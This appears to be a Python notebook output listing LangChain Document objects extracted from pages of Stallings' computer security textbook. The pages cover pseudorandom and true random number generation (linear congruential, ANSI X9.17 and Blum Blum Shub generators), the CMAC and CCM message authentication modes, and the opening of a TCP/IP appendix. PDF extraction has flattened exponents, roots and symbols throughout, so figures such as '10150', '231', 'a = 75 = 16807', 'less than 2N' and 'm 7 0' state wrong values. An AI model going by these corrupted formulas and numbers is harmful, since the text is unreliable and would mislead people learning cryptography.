from the others.\\nAlthough there are well-defined tests for determining that a sequence of num-\\nbers matches a particular distribution, such as the uniform distribution, there is no such \\ntest to “prove” independence. Rather, a number of tests can be applied to demonstrate \\nif a sequence does not exhibit independence. The general strategy is to apply a number \\nof such tests until the confidence that independence exists is sufficiently strong.\\nIn the context of our discussion, the use of a sequence of numbers that appear \\nstatistically random often occurs in the design of algorithms related to cryptography. \\nFor example, a fundamental requirement of the RSA public-key encryption scheme \\ndiscussed in Chapter 21.4 is the ability to generate prime numbers. In  general,\\n it is \\ndifficult to determine if a given large number N  is prime. A brute-force approach \\nwould be to divide N by every odd integer less than 2N. If N is on the order, say, of \\n10150, (a not uncommon occurrence in public-key cryptography), such a brute-force \\napproach is beyond the reach of human analysts and their computers. However, a \\nnumber of effective algorithms exist that test the primality of a number by using a \\nsequence of randomly chosen integers as input to relatively simple computations. \\nZ07_STAL0611_04_GE_APPD.indd   2 10/11/17   3:30 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 921, 'page_label': 'D-3'}, page_content='D.2 / PSEUDORANDOM NUMBER GENERATORS (PRNGS)  D-3\\nIf the sequence is sufficiently long (but far, far less than 210150), the primality of a \\nnumber can be determined with near certainty. This type of approach, known as ran-\\ndomization, crops up frequently in the design of algorithms. In essence, if a problem \\nis too hard or time-consuming to solve exactly, a simpler, shorter approach based \\non randomization is used to provide an answer with any desired level of confidence.\\nUnpredictability\\nIn applications such as reciprocal authentication and session key generation, the \\nrequirement is not so much that the sequence of numbers be statistically random, but \\nthat the successive members of the sequence are unpredictable. With “true” random \\nsequences, each number is statistically independent of other numbers in the sequence \\nand therefore unpredictable. However, as will be discussed shortly, true random num-\\nbers are seldom used; rather, sequences of numbers that appear to be random are \\ngenerated by some algorithm. In this latter case, care must be taken that an opponent \\nnot be able to predict future elements of the sequence on the basis of earlier elements.\\n D.2  PSEUDORANDOM NUMBER GENERA TORS (PRNGS)\\nCryptographic applications typically make use of algorithmic techniques for  r andom \\nnumber generation. These algorithms are deterministic, and therefore produce \\nsequences of numbers that are not statistically random. However, if the algorithm is \\ngood, the resulting sequences will pass many reasonable tests of randomness. Such \\nnumbers are referred to as pseudorandom numbers.\\nYou may be somewhat uneasy about the concept of using numbers generated \\nby a deterministic algorithm as if they were random numbers. Despite what might be \\ncalled philosophical objections to such a practice, it generally works. As one expert \\non probability theory puts it [HAMM91]:\\nFor practical purposes we are forced to accept the awkward concept of \\n “r\\nelatively random” meaning that with regard to the proposed use we can see \\nno reason why they will not perform as if they were random (as the theory usu-\\nally requires). This is highly subjective and is not very palatable to purists, but \\nit is what statisticians regularly appeal to when they take “a random sample” —\\nthey hope that any results they use will have approximately the same properties \\nas a complete counting of the whole sample space that occurs in their theory.\\nLinear Congruential Generators\\nBy far, the most widely used technique for pseudorandom number generation is \\nan algorithm first proposed by Lehmer [LEHM51], which is known as the linear \\ncongruential method. The algorithm is parameterized with four numbers, as follows:\\nm the modulus m 7 0\\na the multiplier 0 6 a 6 m\\nc the increment 0 … c 6 m\\nX0 the starting value, or seed 0 … X0 6 m\\nZ07_STAL0611_04_GE_APPD.indd   3 10/11/17   3:30 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 922, 'page_label': 'D-4'}, page_content='D-4  APPENDIX D / RANDOM AND PSEUDORANDOM NUMBER GENERA TION\\nThe sequence of random numbers 5Xn6 is obtained via the following iterative \\nequation:\\nXn + 1 = (aXn + c) mod m\\nIf m, a, c, and X0 are integers, then this technique will produce a sequence of \\nintegers with each integer in the range 0 … Xn 6 m.\\nThe selection of values for a, c, and m is critical in developing a good  r andom \\nnumber generator. For example, consider a = c = 1. The sequence produced is obvi-\\nously not satisfactory. Now consider the values a = 7, c = 0, m = 32, and X0 = 1. \\nThis generates the sequence 57, 17, 23, 1, 7, etc.6, which is also clearly unsat -\\nisfactory. Of the 32 possible values, only 4 are used; thus, the sequence is said to \\nhave a period of 4. If, instead, we change the value of a  to 5, then the sequence is \\n55, 25, 29, 17, 21, 9, 13, 1, 5, etc.6, which increases the period to 8.\\nWe would like m to be very large, so there is the potential for producing a long \\nseries of distinct random numbers. A common criterion is that m be nearly equal to \\nthe maximum representable nonnegative integer for a given computer. Thus, a value \\nof m near to or equal to 231 is typically chosen.\\n[PARK88] proposes three tests to be used in evaluating a random number \\ngenerator:\\nT1: The function should be a full-period generating function. That is, the func-\\ntion should generate all the numbers between 0 and m before repeating.\\nT2: The generated sequence should appear random. Because it is generated \\ndeterministically, the sequence is not random. There is a variety of statisti-\\ncal tests that can be used to assess the degree to which a sequence exhibits \\nrandomness.\\nT3: The function should implement efficiently with 32-bit arithmetic.\\nWith appropriate values of a, c, and m, these three tests can be passed. With \\nrespect to T1, it can be shown that if m is prime and c = 0, then for certain values \\nof a, the period of the generating function is m - 1, with only the value 0 missing. \\nFor 32-bit arithmetic, a convenient prime value of m is 231 - 1. Thus, the generating \\nfunction becomes\\nXn + 1 = (aXn) mod (231 - 1).\\nOf the more than 2 billion possible choices for a, only a handful of multipliers \\npass all three tests. One such value is a = 75 = 16807, which was originally designed \\nfor use in the IBM 360 family of computers [LEWI69]. This generator is widely used \\nand has been subjected to a more thorough testing than any other PRNG. It is fre-\\nquently recommended for statistical and simulation work (e.g., [JAIN91], [SAUE81]).\\nThe strength of the linear congruential algorithm is that if the multiplier and \\nmodulus are properly chosen, the resulting sequence of numbers will be statisti-\\ncally indistinguishable from a sequence drawn at random (but without replacement) \\nfrom the set 1, 2, c, m - 1. But there is nothing random at all about the algo-\\nrithm, apart from the choice of the initial value X0. Once that value is chosen, the \\nremaining numbers in the sequence follow deterministically. This has implications \\nfor cryptanalysis.\\nZ07_STAL0611_04_GE_APPD.indd   4 10/11/17   3:30 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 923, 'page_label': 'D-5'}, page_content='D.2 / PSEUDORANDOM NUMBER GENERATORS (PRNGS)  D-5\\nIf an opponent knows that the linear congruential algorithm is being used \\nand if the parameters are known (e.g., a = 75, c = 0, m = 231 - 1), then once a \\nsingle \\n number is discover\\ned, all subsequent numbers are known. Even if the oppo-\\nnent knows only that a linear congruential algorithm is being used, knowledge of a \\nsmall part of the sequence is sufficient to determine the parameters of the algorithm. \\n Suppose the opponent is able to determine v\\nalues for X0, X1, X2, and X3. Then,\\n X1 = (aX0 + c) mod m\\n X2 = (aX1 + c) mod m\\n X3 = (aX2 + c) mod m\\nThese equations can be solved for a, c, and m.\\nThus, although it is nice to be able to use a good PRNG, it is desirable to make \\nthe actual sequence used nonreproducible, so knowledge of part of the sequence on \\nthe part of an opponent is insufficient to determine future elements of the sequence. \\nThis goal can be achieved in a number of ways. For example, [BRIG79] suggests using \\nan internal system clock to modify the random number stream. One way to use the \\nclock would be to restart the sequence after every N numbers using the current clock \\nvalue (mod m ) as the new seed. Another way would be simply to add the current \\nclock value to each random number (mod m).\\nCryptographically Generated Random Numbers\\nFor cryptographic applications, it makes some sense to take advantage of the encryp-\\ntion logic available to produce random numbers. A number of means have been used, \\nand in this subsection, we look at three representative examples.\\nCyCliC EnCryption Figure D.1 illustrates an approach suggested in [MEYE82]. In \\nthis case, the procedure is used to generate session keys from a master key. A counter \\nwith period N provides input to the encryption logic. For example, if 56-bit DES keys \\nFigure D.1 Pseudorandom Number \\nGeneration fr\\nom a Counter\\nC\\nC + 1\\nCounter with\\nPeriod N\\nEncryption\\nAlgorithm\\nMaster Key\\nKm\\nX i = E[K m , C + 1]\\nZ07_STAL0611_04_GE_APPD.indd   5 10/11/17   3:30 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 924, 'page_label': 'D-6'}, page_content='D-6  APPENDIX D / RANDOM AND PSEUDORANDOM NUMBER GENERATION\\nare to be produced, then a counter with period 256 can be used. After each key is pro-\\nduced, the counter is incremented by 1. Thus, the pseudorandom numbers produced \\nby this scheme cycle through a full period: Each of the outputs X0, X1, cXN - 1 \\nis based on a different counter value, and therefore X0 /uni2260.alt1X1 /uni2260.alt1c /uni2260.alt1XN - 1. \\nBecause the master key is protected, it is not computationally feasible to deduce \\nany of the session keys (random numbers) through knowledge of one or more earlier \\nsession keys.\\nTo strengthen the algorithm further, the input could be the output of a full-\\nperiod PRNG rather than a simple counter.\\nDES output FEEDbaCk MoDE The cipher feedback (CFB) mode (see Figure 20.7) \\nof DES can be used for key generation as well as for stream encryption. Notice \\nthat the output of each stage of operation is a 64-bit value, of which the s leftmost \\nbits are fed back for encryption. Successive 64-bit outputs constitute a sequence of \\npseudorandom numbers with good statistical properties. Again, as with the approach \\nsuggested in the preceding subsection, the use of a protected master key protects the \\ngenerated session keys.\\nanSi \\nX9.17 prnG One of the strongest (cryptographically speaking) PRNGs is \\nspecified in ANSI X9.17 . A number of applications employ this technique, including \\nfinancial security applications and the secure e-mail program PGP .\\nF\\nigure D.2 illustrates the algorithm, which makes use of triple DES for \\n encryption. \\nThe ingredients are as follows:\\n• Input: \\nTwo pseudorandom inputs drive the generator. One is a 64-bit represen-\\ntation of the current date and time, which is updated on each number genera-\\ntion. The other is a 64-bit seed value; this is initialized to some arbitrary value \\nand is updated during the generation process.\\n• Ke\\nys: The generator makes use of three triple DES encryption modules. All \\nthree make use of the same pair of 56-bit keys, which must be kept secret and \\nare used only for pseudorandom number generation.\\nFigure D.2 ANSI X9.17 Pseudorandom Number Generat or\\nEDE\\nEDE\\nEDE\\nK 1, K2\\nDT i\\nVi\\nRi\\nVi+1\\nZ07_STAL0611_04_GE_APPD.indd   6 10/11/17   3:30 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 925, 'page_label': 'D-7'}, page_content='D.2 / PSEUDORANDOM NUMBER GENERATORS (PRNGS)  D-7\\n• Output: The output consists of a 64-bit pseudor andom number and a 64-bit \\nseed value.\\nDefine the following quantities:\\nDTi Date/time value at the beginning of ith generation stage\\nVi Seed value at the beginning of ith generation stage\\nRi Pseudorandom number produced by the ith generation stage\\nK1, K2 DES keys used for each stage\\nThen,\\n Ri = EDE([K1, K2], [Vi /uni2295.altEDE([K1, K2], DTi)])\\n Vi+ 1 = EDE([K1, K2], [Ri /uni2295.altEDE([K1, K2], DTi)])\\nwhere EDE([K1, K2], X) refers to the sequence encrypt-decrypt-encrypt using \\ntwo-key triple DES to encrypt X.\\nSeveral factors contribute to the cryptographic strength of this method. The \\ntechnique involves a 112-bit key and three EDE encryptions for a total of nine DES \\nencryptions. The scheme is driven by two pseudorandom inputs, the date and time \\nvalue, and a seed produced by the generator that is distinct from the pseudoran-\\ndom number produced by the generator. Thus, the amount of material that must be \\ncompromised by an opponent is overwhelming. Even if a pseudorandom number Ri \\nwere compromised, it would be impossible to deduce the Vi + 1 from the Ri because \\nan additional EDE operation is used to produce the Vi + 1.\\nBlum Blum Shub Generator\\nA popular approach to generating secure pseudorandom number is known as the \\nBlum, Blum, Shub (BBS) generator, named for its developers [BLUM86]. It has \\nperhaps the strongest public proof of its cryptographic strength. The procedure is as \\nfollows. First, choose two large prime numbers, p and q, that both have a remainder \\nof 3 when divided by 4. That is,\\np K q K 3 (mod 4)\\nThis notation, explained more fully in Appendix B, simply means that \\n(p mod 4) = (q mod 4) = 3. For example, the prime numbers 7 and 11 satisfy \\n7 K 11 K 3 (mod 4). Let n = p * q. Next, choose a random number s, such that s is \\nrelatively prime to n; this is equivalent to saying that neither p nor q is a factor of s. \\nThen\\xa0the BBS generator produces a sequence of bits Bi according to the following \\nalgorithm:\\n X0 = s2 mod n\\n for i = 1 to /uni221E\\n Xi = (Xi - 1)2 mod n\\n Bi = Xi mod 2\\nThus, the least significant bit is taken at each iteration. Table D.1 gives an exam-\\nple of BBS operation. Here, n = 192649 = 383 * 503, and the seed s = 101355.\\nZ07_STAL0611_04_GE_APPD.indd   7 10/11/17   3:30 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 926, 'page_label': 'D-8'}, page_content='D-8  APPENDIX D / RANDOM AND PSEUDORANDOM NUMBER GENERA TION\\nThe BBS is referred to as a cryptographically secure pseudorandom bit genera-\\ntor (CSPRBG). A CSPRBG is defined as one that passes the next-bit test, which, in \\nturn, is defined as follows [MENE97]: A pseudorandom bit generator is said to pass \\nthe next-bit test if there is not a polynomial-time algorithm1 that, on input of the first \\nk bits of an output sequence, can predict the (k + 1)st bit with probability signifi-\\ncantly greater than 1/2. In other words, given the first k bits of the sequence, there is \\nnot a practical algorithm that can even allow you to state that the next bit will be 1 \\n(or 0) with probability greater than 1/2. For all practical purposes, the sequence is \\nunpredictable. The security of BBS is based on the difficulty of factoring n. That is, \\ngiven n, we need to determine its two prime factors p and q.\\n D.3  TR UE RANDOM NUMBER GENERATORS\\nA true random number generator (TRNG) uses a nondeterministic source to produce \\nrandomness. Most operate by measuring unpredictable natural processes, such as pulse \\ndetectors of ionizing radiation events, gas discharge tubes, and leaky \\n capacitors\\n. Intel \\nhas developed a commercially available chip that samples thermal noise by amplify-\\ning the voltage measured across undriven resistors [JUN99]. A group at Bell Labs \\nhas developed a technique that uses the variations in the response time of raw read \\nrequests for one disk sector of a hard disk [JAKO98]. LavaRnd is an open source proj-\\nect for creating truly random numbers using inexpensive cameras, open source code, \\nand inexpensive hardware. The system uses a saturated CCD in a light-tight can as a \\nchaotic source to produce the seed. Software processes the result into truly random \\nnumbers in a variety of formats.\\nThere are problems both with the randomness and the precision of such numbers \\n[BRIG79], to say nothing of the clumsy requirement of attaching one of these devices \\nto every system in an internetwork. Another alternative is to dip into a published \\ncollection of good-quality random numbers (e.g., [RAND55], [TIPP27]). However, \\nthese collections provide a very limited source of numbers compared to the potential \\nrequirements of a sizable network security application. Furthermore, although the \\nnumbers in these books do indeed exhibit statistical randomness, they are predictable, \\nbecause an opponent who knows that the book is in use can obtain a copy.\\n1A polynomial-time algorithm of order k is one whose running time is bounded by a polynomial of order k.\\ni Xi Bi i Xi Bi i Xi Bi\\n0 20749 7 45663 1 14 114386 0\\n1 143135 1 8 69442 0 15 14863 1\\n2 177671 1 9 186894 0 16 133015 1\\n3 97048 0 10 177046 0 17 106065 1\\n4 89992 0 11 137922 0 18 45870 0\\n5 174051 1 12 123175 1 19 137171 1\\n6 80649 1 13 8630 0 20 48060 0\\nTable D.1   Example Operation of BBS Generat or\\nZ07_STAL0611_04_GE_APPD.indd   8 10/11/17   3:30 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 927, 'page_label': 'D-9'}, page_content='D.4 / REFERENCES  D-9\\nSkew\\nA true random number generator may produce an output that is biased in some way, \\nsuch as having more ones than zeros or vice versa. Various methods of modifying a \\nbit stream to reduce or eliminate the bias have been developed. These are referred to \\nas deskewing algorithms. One approach to deskew is to pass the bit stream through \\na hash function such as MD5 or SHA (described in Chapter 21). The hash function \\nproduces an n-bit output from an input of arbitrary length. For deskewing, blocks of \\nm input bits, with m Ú n, can be passed through the hash function.\\nBLUM86 Blum, L.,  Blum, M., and Shub, M. “A Simple Unpredictable Pseudo-Random \\nNumber Generator.” SIAM Journal on Computing, No. 2, 1986.\\nBRIG79 Bright, H.,\\n and Enison, R. “Quasi-Random Number Sequences from Long-Period \\nTLP Generator with Remarks on Application to Cryptography.” Computing Surveys , \\nDecember 1979.\\nHAMM91 Hamming,\\n R. The Art of Probability for Scientists and Engineers. Reading, MA: \\nAddison-Wesley, 1991.\\nJAIN91 Jain,\\n R. The Art of Computer Systems Performance Analysis: Techniques for \\n Experimental Design,\\n Measurement, Simulation, and Modeling. New York: Wiley, 1991.\\nJAKO98 Jak\\nobsson, M., Shriver, E., Hillyer, B., and Juels, A. “A practical secure  physical \\nrandom bit gener\\nator.” Proceedings of The Fifth ACM Conference on Computer and \\n Communications Security\\n, November 1998.\\nJUN99 Ju\\nn, B., and Kocher, P . The Intel Random Number Generator. Intel White Paper, \\nApril 22, 1999.\\nLEHM51 Lehmer,\\n D. “Mathematical Methods in Large-Scale Computing.” Proceedings, \\n2nd Symposium on Large-Scale Digital Calculating Machinery, Cambridge, MA: Harvard \\nUniversity Press, 1951.\\nLEWI69 Lewis,\\n P ., Goodman, A., and Miller, J. “A Pseudo-Random Number Generator for \\nthe System/360.” IBM Systems Journal, No. 2, 1969.\\nMENE97 Menezes,\\n A., van Oorschot, P ., and Vanstone, S. Handbook of Applied \\n Cryptograph\\ny. Boca Raton, FL: CRC Press, 1997 .\\nMEYE82 Meyer,\\n C., and Matyas, S. Cryptography: A New Dimension in Computer Data \\nSecurity. New York: Wiley, 1982.\\nPARK88 Park,\\n S., and Miller, K. “Random Number Generators: Good Ones Are Hard to \\nFind.” Communications of the ACM, October 1988.\\nRAND55 Rand Corpor\\nation. A Million Random Digits. New York: The Free Press, 1955. \\nhttp://www.rand.org/publications/classics/randomdigits.\\nSAUE81 Sauer,\\n C., and Chandy, K. Computer Systems Performance Modeling. Englewood \\nCliffs, NJ: Prentice Hall, 1981.\\nTIPP27 Ti\\nppett, L. Random Sampling Numbers.  Cambridge, England: Cambridge \\n University Press\\n, 1927 .\\n D.4 REFERENCES\\nZ07_STAL0611_04_GE_APPD.indd   9 10/11/17   3:30 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 928, 'page_label': 'E-1'}, page_content='E-1\\nAPPENDIX E\\nMEssAgE AuthENtIcAtIoN coDEs BAsED  \\noN Block cIPhErs\\nE.1 Cipher-Based Message Authentication Code\\nE.\\n2\\n Counter with Cipher Block Chaining Message Authentication Code\\nZ08_STAL0611_04_GE_APPE.indd   1 10/11/17   3:30 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 929, 'page_label': 'E-2'}, page_content='E-2  APPENDIX E / MESSAGE A UTHENTICATION CODES BASED ON BLOCK CIPHERS\\nIn this section, we look at several MACs based on the use of a block cipher.\\n E.1 CIPHER-BASED MESSA GE AUTHENTICATION CODE\\nThe Cipher-based Message Authentication Code (CMAC) mode of operation is for \\nuse with AES and triple DES. It is specified in NIST Special Publication 800-38B.\\nFirst, let us consider the operation of CMAC when the message is an integer \\nmultiple n of the cipher block length b. For AES, b = 128, and for triple DES, b = 64. \\nThe message is divided into n blocks (M1, M2, c, Mn). The algorithm makes use \\nof a k-bit encryption key K and a b-bit constant, K1. For AES, the key size k is 128, \\n192, or 256 bits; for triple DES, the key size is 112 or 168 bits. CMAC is calculated as \\nfollows (see F\\nigure E.1):\\n C1 = E(K, M1)\\n C2 = E(K, [M2 /uni2295.altC1])\\n C3 = E(K, [M3 /uni2295.altC2])\\n O\\n Cn = E(K, [Mn /uni2295.altCn -1 /uni2295.altK1])\\n T = MSBTlen(Cn)\\nFigure E.1 Cipher-Based Message Authentication Code (CMAC)\\nEncryptK K K\\nT\\nEncrypt Encrypt\\nMSB(Tlen)\\nM 1 M 2\\nK 1\\nM n\\n(a) Message length is integer multiple of block size\\nEncryptK K K\\nT\\nEncrypt Encrypt\\nMSB(Tlen)\\nM 1 M 2\\nK 2\\nM n 10...0\\n(b) Message length is not integer multiple of block size\\nb\\nk\\nZ08_STAL0611_04_GE_APPE.indd   2 10/11/17   3:30 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 930, 'page_label': 'E-3'}, page_content='E.2 / COUNTER WITH CIPHER BLOCK CHAINING MESSAGE AUTHENTICATION CODE  E-3\\nwhere\\nT = message authentication code, also referred to as the tag,\\nTlen = bit length of T, and\\nMSBs(X) = the s leftmost bits of the bit string X.\\nIf the message is not an integer multiple of the cipher block length, then the \\nfinal block is padded to the right (least significant bits) with a 1 and as many 0s as \\nnecessary so the final block is also of length b. The CMAC operation then proceeds \\nas before, except that a different b-bit key K2 is used instead of K1.\\nTo generate the two b-bit keys, the block cipher is applied to the block that \\nconsists entirely of 0 bits. The first subkey is derived from the resulting ciphertext \\nby a left shift of one bit and, conditionally, by XORing a constant that depends \\non the block size. The second subkey is derived in the same manner from the first \\nsubkey.\\n E.2 COUNTER WITH CIPHER BLOCK CHAINING MESSAGE \\nAUTHENTICATION CODE\\nThe CCM mode of operation, defined in NIST SP 800-38C, is referred to as an \\nauthenticated encryption mode. Authenticated encryption is a term used to describe \\nencryption systems that simultaneously protect confidentiality and authentic-\\nity (integrity) of communications. Many applications and protocols require \\nboth forms of security, but until recently, the two services have been designed  \\nseparately.\\nThe key algorithmic ingredients of CCM are the AES encryption algorithm  \\n(see Section 20.3), the CTR mode of operation (see Section 20.5), and the CMAC \\nauthentication algorithm. A single key K is used for both encryption and MAC algo-\\nrithms. The input to the CCM encryption process consists of three elements:\\n1. Data that will be both authenticated and encrypted.\\n This is the plaintext \\n message P of data block.\\n2. Associated data A that will be authenticated but not encrypted. \\nAn example is a \\nprotocol header that must be transmitted in the clear for proper protocol opera-\\ntion but which needs to be authenticated.\\n3. A nonce N  that is assigned to the payload and the associated data. This is a \\nunique value that is different for every instance during the lifetime of a protocol \\nassociation and is intended to prevent replay attacks and certain other types \\nof attacks.\\nF\\nigure E.2 illustrates the operation of CCM. For authentication, the input includes \\nthe nonce, the plaintext, and the associated data. This input is formatted as a \\nsequence of blocks B0 through Br. The first block contains the nonce plus some for-\\nmatting bits that indicate the lengths of the N , P, and A elements. This is followed \\nby zero or more blocks that contain P, followed by zero of more blocks that contain \\nA. The resulting sequence of blocks serves as input to the CMAC algorithm, which \\nproduces a MAC value with length Tlen, which is less than or equal to the block \\nlength (see F\\nigure E.2a).\\nZ08_STAL0611_04_GE_APPE.indd   3 10/11/17   3:30 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 931, 'page_label': 'E-4'}, page_content='E-4  APPENDIX E / MESSA GE AUTHENTICATION CODES BASED ON BLOCK CIPHERS\\nFor encryption, a sequence of counters is generated that must be independent \\nof the nonce. The authentication tag is encrypted in CTR mode using the single \\ncounter Ctr0. The Tlen most significant bits of the output are XORed with the tag \\nto produce an encrypted tag. The remaining counters are used for the CTR mode \\nencryption of the plaintext (see Figure 20.9). The encrypted plaintext is concatenated \\nwith the encrypted tag to form the ciphertext output (see Figure E.2b).\\nFigure E.2 Counter with Cipher Block Chaining-MessageA uthentication Code (CCM)\\n(a) Authentication\\n(b) Encryption\\nB0\\nCtr0\\nB1 B2 Br\\nTag\\nTag\\nNonce Plaintext\\nPlaintext\\nCiphertext\\nAss. Data\\nK CMAC\\nMSB(Tlen)\\nK CTRCtr1 , Ctr 2 , ... Ctr m\\nEncryptK\\nZ08_STAL0611_04_GE_APPE.indd   4 10/11/17   3:30 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 932, 'page_label': 'F-1'}, page_content='F-1\\nAPPENDIX F\\nThE TCP/IP ProToCol ArChITECTurE\\nF.1 TCP/IP Layers\\nF.\\n2\\n TCP and UDP\\nF.\\n3\\n Operation of TCP/IP\\nF.\\n4\\n TCP/IP Applications\\nZ09_STAL0611_04_GE_APPF.indd   1 10/11/17   3:39 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 933, 'page_label': 'F-2'}, page_content='F-2  APPENDIX F / THE TCP/IP PR OTOCOL ARCHITECTURE\\nTCP/IP is a result of protocol research and development conducted on the experi-\\nmental packet-switched network, ARPANET, funded by the Defense Advanced \\nResearch Projects Agency (DARPA), and is generally referred to as the TCP/IP \\nprotocol suite. This protocol suite consists of a large collection of protocols that \\nhave been issued as Internet standards by the Internet Activities Board (IAB). \\n Appendix\\xa0C pr\\novides a discussion of Internet standards.\\n F.1  TCP/IP LA YERS\\nIn general terms, communications can be said to involve three agents: applications, \\ncomputers, and networks. Examples of applications include file transfer and electronic \\nmail. The applications that we are concerned with here are distributed applications \\nthat involve the exchange of data between two computer systems. These applica-\\ntions, and others, execute on computers that can often support multiple simultaneous \\napplications. Computers are connected to networks, and the data to be exchanged \\nare transferred by the network from one computer to another. Thus, the transfer of \\ndata from one application to another involves first getting the data to the computer \\nin which the application resides then getting the data to the intended application \\nwithin the computer.\\nThere is no official TCP/IP protocol model. However, based on the protocol \\nstandards that have been developed, we can organize the communication task for \\nTCP/IP into five relatively independent layers, from bottom to top:\\n•\\n Physical la\\nyer\\n•\\n Network access la\\nyer\\n•\\n Internet la\\nyer\\n•\\n Host-to-host,\\n or transport layer\\n•\\n Application la\\nyer\\nThe physical layer covers the physical interface between a data transmission \\ndevice (e.g., workstation, computer) and a transmission medium or network. This \\nlayer is concerned with specifying the characteristics of the transmission medium, \\nthe nature of the signals, the data rate, and related matters.\\nThe network access layer is concerned with the exchange of data between an \\nend system (server, workstation, etc.) and the network to which it is attached. The \\nsending computer must provide the network with the address of the destination \\n c\\nomputer, so the network may route the data to the appropriate destination. The \\nsending computer may wish to invoke certain services, such as 